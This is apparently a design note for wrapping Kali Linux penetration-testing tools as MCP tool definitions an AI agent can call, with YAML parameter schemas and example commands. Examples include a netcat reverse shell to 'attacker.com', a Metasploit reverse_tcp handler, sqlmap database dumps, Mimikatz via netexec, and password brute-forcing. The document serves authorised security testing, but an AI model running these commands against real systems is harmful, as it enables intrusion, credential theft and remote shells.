# Kali Linux Tools Research for MCP Integration

## Overview

- **Total Tools in Kali**: 600+ tools
- **en.kali.tools Database**: 3,185 security tools catalogued
- **Priority for MCP**: Start with top 50-100 most used tools

---

## Tool Categories (Kali Menu Structure)

| Category | Tool Count (Est.) | Priority |
|----------|------------------|----------|
| Information Gathering | 75+ | HIGH |
| Vulnerability Analysis | 40+ | HIGH |
| Web Application Analysis | 50+ | HIGH |
| Database Assessment | 15+ | MEDIUM |
| Password Attacks | 30+ | HIGH |
| Wireless Attacks | 25+ | LOW |
| Reverse Engineering | 15+ | LOW |
| Exploitation Tools | 20+ | MEDIUM |
| Sniffing & Spoofing | 20+ | MEDIUM |
| Post Exploitation | 15+ | MEDIUM |
| Forensics | 20+ | LOW |
| Reporting Tools | 10+ | LOW |
| Social Engineering | 10+ | LOW |

---

## Priority 1: Core Tools (Must Have - 30 tools)

### Reconnaissance & Scanning

#### nmap
```yaml
name: nmap
category: recon
description: Network exploration tool and security/port scanner
keywords: [port, scan, network, discovery, service, version, script, nse]
parameters:
  target:
    type: string
    required: true
    description: Target IP, hostname, CIDR, or range
  scan_type:
    type: enum
    options:
      - value: "-sS"
        description: "SYN scan (stealth, requires root)"
      - value: "-sT"
        description: "TCP connect scan"
      - value: "-sU"
        description: "UDP scan"
      - value: "-sV"
        description: "Version detection"
      - value: "-sC"
        description: "Default scripts"
      - value: "-sn"
        description: "Ping scan (no port scan)"
    default: "-sS"
  ports:
    type: string
    description: "Port specification (-p 22,80,443 or -p- for all)"
  timing:
    type: enum
    options: ["-T0", "-T1", "-T2", "-T3", "-T4", "-T5"]
    default: "-T4"
    description: "Timing template (0=paranoid, 5=insane)"
  scripts:
    type: string
    description: "NSE scripts (--script=vuln,default)"
  os_detect:
    type: boolean
    flag: "-O"
    description: "Enable OS detection"
  aggressive:
    type: boolean
    flag: "-A"
    description: "Aggressive scan (OS + version + scripts + traceroute)"
  no_ping:
    type: boolean
    flag: "-Pn"
    description: "Skip host discovery"
  output:
    type: string
    description: "Output file (-oN normal, -oX xml, -oA all)"
examples:
  - "nmap -sS -sV -T4 192.168.1.1"
  - "nmap -sC -sV -p- -T4 target.com"
  - "nmap --script=vuln -Pn 10.0.0.0/24"
  - "nmap -sU --top-ports 20 192.168.1.1"
```

#### masscan
```yaml
name: masscan
category: recon
description: Fast TCP port scanner (faster than nmap for large networks)
keywords: [port, scan, fast, mass, network]
parameters:
  target:
    type: string
    required: true
    description: Target IP or CIDR range
  ports:
    type: string
    required: true
    description: "Port range (-p1-65535 or -p80,443)"
  rate:
    type: integer
    default: 1000
    description: "Packets per second (--rate)"
  output:
    type: string
    description: "Output file (-oJ json, -oX xml, -oL list)"
examples:
  - "masscan -p1-65535 192.168.1.0/24 --rate=10000"
  - "masscan -p80,443,8080 10.0.0.0/8 --rate=100000 -oJ scan.json"
```

#### subfinder
```yaml
name: subfinder
category: recon
description: Subdomain discovery tool using passive sources
keywords: [subdomain, discovery, dns, enumeration, passive]
parameters:
  domain:
    type: string
    required: true
    flag: "-d"
    description: Target domain
  output:
    type: string
    flag: "-o"
    description: Output file
  silent:
    type: boolean
    flag: "-silent"
    description: Silent mode (only subdomains)"
  recursive:
    type: boolean
    flag: "-recursive"
    description: Use recursive subdomain enumeration
  all:
    type: boolean
    flag: "-all"
    description: Use all sources
examples:
  - "subfinder -d target.com -silent"
  - "subfinder -d target.com -all -o subs.txt"
```

#### amass
```yaml
name: amass
category: recon
description: In-depth attack surface mapping and asset discovery
keywords: [subdomain, dns, enumeration, osint, asset, discovery]
parameters:
  mode:
    type: enum
    options: ["enum", "intel", "viz", "track", "db"]
    default: "enum"
    description: Amass subcommand
  domain:
    type: string
    required: true
    flag: "-d"
    description: Target domain
  passive:
    type: boolean
    flag: "-passive"
    description: Passive mode only (no DNS resolution)
  active:
    type: boolean
    flag: "-active"
    description: Active mode (DNS brute force)
  output:
    type: string
    flag: "-o"
    description: Output file
examples:
  - "amass enum -passive -d target.com"
  - "amass enum -active -d target.com -o results.txt"
```

### Web Application Testing

#### sqlmap
```yaml
name: sqlmap
category: web
description: Automatic SQL injection and database takeover tool
keywords: [sql, injection, database, sqli, exploit, dump]
parameters:
  url:
    type: string
    required: true
    flag: "-u"
    description: Target URL with parameter (e.g., http://site.com/page?id=1)
  data:
    type: string
    flag: "--data"
    description: POST data string
  cookie:
    type: string
    flag: "--cookie"
    description: HTTP Cookie header value
  level:
    type: integer
    flag: "--level"
    default: 1
    description: "Level of tests (1-5)"
  risk:
    type: integer
    flag: "--risk"
    default: 1
    description: "Risk of tests (1-3)"
  dbs:
    type: boolean
    flag: "--dbs"
    description: Enumerate databases
  tables:
    type: boolean
    flag: "--tables"
    description: Enumerate tables
  dump:
    type: boolean
    flag: "--dump"
    description: Dump table entries
  database:
    type: string
    flag: "-D"
    description: Database to enumerate
  table:
    type: string
    flag: "-T"
    description: Table to enumerate
  batch:
    type: boolean
    flag: "--batch"
    description: Non-interactive mode
  random_agent:
    type: boolean
    flag: "--random-agent"
    description: Use random User-Agent
  os_shell:
    type: boolean
    flag: "--os-shell"
    description: Prompt for OS shell
  tamper:
    type: string
    flag: "--tamper"
    description: "Tamper scripts (e.g., space2comment)"
examples:
  - "sqlmap -u 'http://target.com/page?id=1' --batch --dbs"
  - "sqlmap -u 'http://target.com/page?id=1' -D db -T users --dump"
  - "sqlmap -u 'http://target.com/login' --data='user=admin&pass=test' --level=5 --risk=3"
```

#### nikto
```yaml
name: nikto
category: web
description: Web server scanner for vulnerabilities and misconfigurations
keywords: [web, scanner, vulnerability, server, cgi]
parameters:
  host:
    type: string
    required: true
    flag: "-h"
    description: Target host/URL
  port:
    type: integer
    flag: "-p"
    description: Port to scan
  ssl:
    type: boolean
    flag: "-ssl"
    description: Force SSL mode
  output:
    type: string
    flag: "-o"
    description: Output file
  format:
    type: enum
    flag: "-Format"
    options: ["csv", "htm", "txt", "xml"]
    description: Output format
  tuning:
    type: string
    flag: "-Tuning"
    description: "Scan tuning (1=interesting files, 2=misconfig, etc.)"
examples:
  - "nikto -h http://target.com"
  - "nikto -h https://target.com -ssl -o report.html -Format htm"
```

#### ffuf
```yaml
name: ffuf
category: web
description: Fast web fuzzer for directory/file discovery and parameter fuzzing
keywords: [fuzz, directory, brute, web, discovery, vhost]
parameters:
  url:
    type: string
    required: true
    flag: "-u"
    description: "Target URL with FUZZ keyword"
  wordlist:
    type: string
    required: true
    flag: "-w"
    description: Wordlist file path
  method:
    type: enum
    flag: "-X"
    options: ["GET", "POST", "PUT", "DELETE", "PATCH"]
    default: "GET"
  data:
    type: string
    flag: "-d"
    description: POST data
  headers:
    type: string
    flag: "-H"
    description: "Headers (can be used multiple times)"
  cookies:
    type: string
    flag: "-b"
    description: Cookie data
  filter_code:
    type: string
    flag: "-fc"
    description: "Filter by status code (e.g., 404,403)"
  match_code:
    type: string
    flag: "-mc"
    description: "Match by status code (e.g., 200,301)"
  filter_size:
    type: string
    flag: "-fs"
    description: Filter by response size
  threads:
    type: integer
    flag: "-t"
    default: 40
    description: Number of threads
  output:
    type: string
    flag: "-o"
    description: Output file
  extensions:
    type: string
    flag: "-e"
    description: "Extensions to append (e.g., .php,.html)"
  recursion:
    type: boolean
    flag: "-recursion"
    description: Enable recursion
examples:
  - "ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt"
  - "ffuf -u http://target.com/FUZZ -w wordlist.txt -mc 200,301 -e .php,.html"
  - "ffuf -u http://target.com/api?param=FUZZ -w params.txt -fc 404"
```

#### gobuster
```yaml
name: gobuster
category: web
description: Directory/file, DNS, and vhost brute-forcing tool
keywords: [directory, brute, dns, vhost, discovery]
parameters:
  mode:
    type: enum
    required: true
    options: ["dir", "dns", "vhost", "fuzz", "s3", "gcs", "tftp"]
    description: Gobuster mode
  url:
    type: string
    flag: "-u"
    description: Target URL (for dir/vhost mode)
  domain:
    type: string
    flag: "-d"
    description: Target domain (for dns mode)
  wordlist:
    type: string
    required: true
    flag: "-w"
    description: Wordlist file
  threads:
    type: integer
    flag: "-t"
    default: 10
    description: Number of threads
  extensions:
    type: string
    flag: "-x"
    description: "File extensions to search"
  status_codes:
    type: string
    flag: "-s"
    description: "Positive status codes"
  exclude_length:
    type: string
    flag: "--exclude-length"
    description: Exclude responses by length
  output:
    type: string
    flag: "-o"
    description: Output file
examples:
  - "gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt"
  - "gobuster dir -u http://target.com -w wordlist.txt -x php,html,txt -t 50"
  - "gobuster dns -d target.com -w subdomains.txt"
  - "gobuster vhost -u http://target.com -w vhosts.txt"
```

#### nuclei
```yaml
name: nuclei
category: web
description: Fast vulnerability scanner based on templates
keywords: [vulnerability, scanner, template, cve, exploit]
parameters:
  target:
    type: string
    flag: "-u"
    description: Target URL
  list:
    type: string
    flag: "-l"
    description: File containing list of targets
  templates:
    type: string
    flag: "-t"
    description: "Templates to run (path or comma-separated)"
  tags:
    type: string
    flag: "-tags"
    description: "Tags to run (e.g., cve,rce,lfi)"
  severity:
    type: string
    flag: "-s"
    description: "Severities to run (critical,high,medium,low,info)"
  output:
    type: string
    flag: "-o"
    description: Output file
  json:
    type: boolean
    flag: "-json"
    description: JSON output
  rate_limit:
    type: integer
    flag: "-rl"
    description: Rate limit (requests per second)
  bulk_size:
    type: integer
    flag: "-bs"
    description: Bulk size for parallel processing
  headless:
    type: boolean
    flag: "-headless"
    description: Enable headless browser
examples:
  - "nuclei -u http://target.com -tags cve"
  - "nuclei -l urls.txt -t /path/to/templates -s critical,high"
  - "nuclei -u http://target.com -tags rce,sqli -o results.txt"
```

#### wpscan
```yaml
name: wpscan
category: web
description: WordPress security scanner
keywords: [wordpress, cms, scanner, plugin, theme, vulnerability]
parameters:
  url:
    type: string
    required: true
    flag: "--url"
    description: Target WordPress URL
  enumerate:
    type: string
    flag: "-e"
    description: "Enumeration (u=users, p=plugins, t=themes, vp=vuln plugins)"
  api_token:
    type: string
    flag: "--api-token"
    description: WPScan API token for vulnerability data
  passwords:
    type: string
    flag: "-P"
    description: Password list for brute force
  usernames:
    type: string
    flag: "-U"
    description: Username list for brute force
  output:
    type: string
    flag: "-o"
    description: Output file
  format:
    type: enum
    flag: "-f"
    options: ["cli", "json", "cli-no-color"]
examples:
  - "wpscan --url http://target.com -e vp,vt,u"
  - "wpscan --url http://target.com -e u -P passwords.txt"
```

### Password Attacks

#### hydra
```yaml
name: hydra
category: password
description: Fast and flexible network login cracker
keywords: [brute, force, password, login, crack, ssh, ftp, http]
parameters:
  target:
    type: string
    required: true
    description: Target host
  service:
    type: enum
    required: true
    options: ["ssh", "ftp", "http-get", "http-post-form", "smb", "rdp", "mysql", "mssql", "postgres", "telnet", "vnc", "pop3", "imap", "smtp"]
    description: Service to attack
  username:
    type: string
    flag: "-l"
    description: Single username
  username_list:
    type: string
    flag: "-L"
    description: Username list file
  password:
    type: string
    flag: "-p"
    description: Single password
  password_list:
    type: string
    flag: "-P"
    description: Password list file
  port:
    type: integer
    flag: "-s"
    description: Custom port
  threads:
    type: integer
    flag: "-t"
    default: 16
    description: Number of threads
  verbose:
    type: boolean
    flag: "-V"
    description: Verbose output
  http_form:
    type: string
    description: "For http-post-form: /path:user=^USER^&pass=^PASS^:F=failed"
examples:
  - "hydra -l admin -P passwords.txt ssh://192.168.1.1"
  - "hydra -L users.txt -P passwords.txt ftp://target.com"
  - "hydra -l admin -P pass.txt target.com http-post-form '/login:user=^USER^&pass=^PASS^:F=incorrect'"
```

#### john
```yaml
name: john
category: password
description: John the Ripper password cracker
keywords: [password, crack, hash, brute, dictionary]
parameters:
  hash_file:
    type: string
    required: true
    description: File containing password hashes
  wordlist:
    type: string
    flag: "--wordlist"
    description: Wordlist file
  format:
    type: string
    flag: "--format"
    description: "Hash format (e.g., raw-md5, sha512crypt, ntlm)"
  rules:
    type: string
    flag: "--rules"
    description: Enable word mangling rules
  show:
    type: boolean
    flag: "--show"
    description: Show cracked passwords
  incremental:
    type: boolean
    flag: "--incremental"
    description: Incremental (brute force) mode
examples:
  - "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt"
  - "john --format=raw-md5 --wordlist=passwords.txt hashes.txt"
  - "john --show hashes.txt"
```

#### hashcat
```yaml
name: hashcat
category: password
description: Advanced GPU-based password recovery
keywords: [password, crack, hash, gpu, brute, dictionary]
parameters:
  hash_file:
    type: string
    required: true
    description: File containing hashes
  attack_mode:
    type: enum
    flag: "-a"
    options:
      - value: "0"
        description: "Straight (dictionary)"
      - value: "1"
        description: "Combination"
      - value: "3"
        description: "Brute-force"
      - value: "6"
        description: "Hybrid wordlist + mask"
      - value: "7"
        description: "Hybrid mask + wordlist"
    default: "0"
  hash_type:
    type: integer
    flag: "-m"
    description: "Hash type (0=MD5, 100=SHA1, 1000=NTLM, 1800=sha512crypt, etc.)"
  wordlist:
    type: string
    description: Wordlist file (for attack mode 0)
  mask:
    type: string
    description: "Mask for brute force (?a=all, ?d=digit, ?l=lower, ?u=upper)"
  rules:
    type: string
    flag: "-r"
    description: Rules file
  output:
    type: string
    flag: "-o"
    description: Output file
  show:
    type: boolean
    flag: "--show"
    description: Show cracked passwords
examples:
  - "hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt"
  - "hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a?a?a"
  - "hashcat -m 1800 -a 0 shadow.txt wordlist.txt -r rules/best64.rule"
```

### Exploitation

#### metasploit
```yaml
name: msfconsole
category: exploit
description: Metasploit Framework console for exploitation
keywords: [exploit, payload, shell, meterpreter, vulnerability]
parameters:
  resource:
    type: string
    flag: "-r"
    description: Resource script to execute
  execute:
    type: string
    flag: "-x"
    description: Command to execute on startup
  quiet:
    type: boolean
    flag: "-q"
    description: Quiet mode (no banner)
examples:
  - "msfconsole -q"
  - "msfconsole -r script.rc"
  - "msfconsole -q -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; run'"
notes: |
  Common Metasploit commands:
  - search <term>: Search for modules
  - use <module>: Select a module
  - info: Show module information
  - show options: Show module options
  - set <option> <value>: Set option value
  - exploit/run: Execute the module
  - sessions: List active sessions
  - background: Background current session
```

#### searchsploit
```yaml
name: searchsploit
category: exploit
description: Search Exploit-DB for exploits and shellcodes
keywords: [exploit, database, search, cve, vulnerability]
parameters:
  search_term:
    type: string
    required: true
    description: Search term(s)
  exact:
    type: boolean
    flag: "-e"
    description: Exact match
  title:
    type: boolean
    flag: "-t"
    description: Search in title only
  path:
    type: boolean
    flag: "-p"
    description: Show full path to exploit
  mirror:
    type: string
    flag: "-m"
    description: Copy exploit to current directory
  examine:
    type: string
    flag: "-x"
    description: Examine/open exploit
  json:
    type: boolean
    flag: "-j"
    description: JSON output
examples:
  - "searchsploit apache 2.4"
  - "searchsploit -t wordpress plugin"
  - "searchsploit -m 42966"
```

### Network Tools

#### wireshark / tshark
```yaml
name: tshark
category: network
description: Terminal-based network protocol analyzer
keywords: [packet, capture, analysis, protocol, sniff]
parameters:
  interface:
    type: string
    flag: "-i"
    description: Network interface to capture
  read_file:
    type: string
    flag: "-r"
    description: Read from pcap file
  write_file:
    type: string
    flag: "-w"
    description: Write to pcap file
  filter:
    type: string
    flag: "-f"
    description: Capture filter (BPF syntax)
  display_filter:
    type: string
    flag: "-Y"
    description: Display filter
  count:
    type: integer
    flag: "-c"
    description: Number of packets to capture
  fields:
    type: string
    flag: "-T fields -e"
    description: Extract specific fields
examples:
  - "tshark -i eth0 -w capture.pcap"
  - "tshark -r capture.pcap -Y 'http.request'"
  - "tshark -i eth0 -f 'tcp port 80'"
```

#### netcat
```yaml
name: nc
category: network
description: Network utility for reading/writing network connections
keywords: [network, connect, listen, shell, transfer]
parameters:
  host:
    type: string
    description: Target host
  port:
    type: integer
    description: Port number
  listen:
    type: boolean
    flag: "-l"
    description: Listen mode
  verbose:
    type: boolean
    flag: "-v"
    description: Verbose output
  udp:
    type: boolean
    flag: "-u"
    description: UDP mode
  execute:
    type: string
    flag: "-e"
    description: Execute command on connection
  zero_io:
    type: boolean
    flag: "-z"
    description: Zero-I/O mode (scanning)
examples:
  - "nc -lvnp 4444"
  - "nc target.com 80"
  - "nc -zv target.com 1-1000"
  - "nc -e /bin/bash attacker.com 4444"
```

#### responder
```yaml
name: responder
category: network
description: LLMNR/NBT-NS/mDNS poisoner for credential capture
keywords: [llmnr, netbios, poison, credentials, ntlm, hash]
parameters:
  interface:
    type: string
    required: true
    flag: "-I"
    description: Network interface
  analyze:
    type: boolean
    flag: "-A"
    description: Analyze mode (no poisoning)
  wpad:
    type: boolean
    flag: "-w"
    description: Start WPAD rogue proxy
  fingerprint:
    type: boolean
    flag: "-f"
    description: Fingerprint hosts
  verbose:
    type: boolean
    flag: "-v"
    description: Verbose output
examples:
  - "responder -I eth0"
  - "responder -I eth0 -wrf"
  - "responder -I eth0 -A"
```

### Active Directory

#### bloodhound-python
```yaml
name: bloodhound-python
category: ad
description: Active Directory data collector for BloodHound
keywords: [active, directory, ad, bloodhound, graph, privilege]
parameters:
  domain:
    type: string
    required: true
    flag: "-d"
    description: Target domain
  username:
    type: string
    required: true
    flag: "-u"
    description: Username for authentication
  password:
    type: string
    flag: "-p"
    description: Password
  collection:
    type: string
    flag: "-c"
    description: "Collection method (Default, All, DCOnly, etc.)"
  nameserver:
    type: string
    flag: "-ns"
    description: DNS server IP
  domain_controller:
    type: string
    flag: "-dc"
    description: Domain controller hostname
examples:
  - "bloodhound-python -d domain.local -u user -p pass -c All"
  - "bloodhound-python -d domain.local -u user -p pass -ns 10.0.0.1"
```

#### crackmapexec / netexec
```yaml
name: netexec
category: ad
description: Network execution tool for AD environments
keywords: [active, directory, smb, winrm, lateral, movement]
parameters:
  protocol:
    type: enum
    required: true
    options: ["smb", "winrm", "ssh", "ldap", "mssql", "rdp", "wmi", "ftp"]
    description: Protocol to use
  target:
    type: string
    required: true
    description: Target IP, range, or CIDR
  username:
    type: string
    flag: "-u"
    description: Username
  password:
    type: string
    flag: "-p"
    description: Password
  hash:
    type: string
    flag: "-H"
    description: NTLM hash
  shares:
    type: boolean
    flag: "--shares"
    description: Enumerate shares
  users:
    type: boolean
    flag: "--users"
    description: Enumerate users
  execute:
    type: string
    flag: "-x"
    description: Execute command
  module:
    type: string
    flag: "-M"
    description: Use module
examples:
  - "netexec smb 192.168.1.0/24 -u user -p pass"
  - "netexec smb target -u admin -p pass --shares"
  - "netexec smb target -u admin -H hash -x 'whoami'"
  - "netexec smb target -u admin -p pass -M mimikatz"
```

#### impacket-scripts
```yaml
name: impacket
category: ad
description: Collection of Python classes for network protocols
keywords: [active, directory, smb, kerberos, ntlm, psexec]
tools:
  - name: psexec.py
    description: Remote command execution via SMB
    example: "psexec.py domain/user:pass@target"
  - name: wmiexec.py
    description: Remote command execution via WMI
    example: "wmiexec.py domain/user:pass@target"
  - name: smbexec.py
    description: Remote command execution via SMB
    example: "smbexec.py domain/user:pass@target"
  - name: secretsdump.py
    description: Dump secrets from SAM/NTDS
    example: "secretsdump.py domain/user:pass@target"
  - name: GetNPUsers.py
    description: AS-REP roasting
    example: "GetNPUsers.py domain/ -usersfile users.txt -no-pass"
  - name: GetUserSPNs.py
    description: Kerberoasting
    example: "GetUserSPNs.py domain/user:pass -request"
  - name: ntlmrelayx.py
    description: NTLM relay attacks
    example: "ntlmrelayx.py -t target -smb2support"
```

---

## Priority 2: Extended Tools (50 more tools)

### Additional Recon
- theharvester - Email/subdomain harvester
- recon-ng - Web reconnaissance framework
- fierce - DNS reconnaissance
- dnsrecon - DNS enumeration
- dnsenum - DNS enumeration
- whatweb - Web technology identifier
- wafw00f - WAF detection
- httpx - Fast HTTP prober
- aquatone - Visual recon

### Additional Web
- burpsuite - Web proxy (CLI limited)
- wfuzz - Web fuzzer
- dirb - Directory scanner
- dirsearch - Directory search
- arjun - Parameter discovery
- xsser - XSS testing
- commix - Command injection
- dalfox - XSS scanner

### Additional Network
- enum4linux - SMB enumeration
- smbmap - SMB share mapper
- smbclient - SMB client
- rpcclient - RPC client
- nbtscan - NetBIOS scanner
- onesixtyone - SNMP scanner
- snmpwalk - SNMP enumeration

### Additional Exploitation
- msfvenom - Payload generator
- shellter - PE infection
- veil - Payload obfuscation

### Wireless (Low Priority)
- aircrack-ng - WiFi cracking
- wifite - Automated WiFi attacks
- reaver - WPS attacks
- bettercap - Network attacks

---

## Wordlist Locations

| Purpose | Path |
|---------|------|
| General | /usr/share/wordlists/rockyou.txt |
| Directories | /usr/share/wordlists/dirb/common.txt |
| Directories Large | /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt |
| Subdomains | /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt |
| Parameters | /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt |
| Passwords | /usr/share/seclists/Passwords/Common-Credentials/ |

---

## Implementation Notes

### Tool Execution Pattern
```typescript
// Each tool definition generates a bash command
interface ToolExecution {
  command: string           // Base command (nmap, sqlmap, etc.)
  args: string[]           // Built from parameters
  timeout?: number         // Default 5 minutes
  requiresRoot?: boolean   // Some tools need sudo
  outputParser?: string    // Optional output parser
}
```

### Output Handling
- Most tools output to stdout
- Some support structured output (-oJ, -oX, --json)
- Parse structured output when available
- Capture stderr for errors

### Security Considerations
- Always require explicit target confirmation
- Rate limit by default
- Log all tool executions
- Timeout long-running scans

---

## Sources

- [Kali Linux Official Tools](https://www.kali.org/tools/)
- [Kali Tools Database](https://en.kali.tools/all/)
- [StationX Penetration Testing Tools](https://www.stationx.net/penetration-testing-tools-for-kali-linux/)
- [SQLMap Cheat Sheet](https://www.stationx.net/sqlmap-cheat-sheet/)
- [Nmap Cheat Sheet](https://www.stationx.net/nmap-cheat-sheet/)
- [GitHub Kali Cheatsheet](https://github.com/NoorQureshi/kali-linux-cheatsheet)
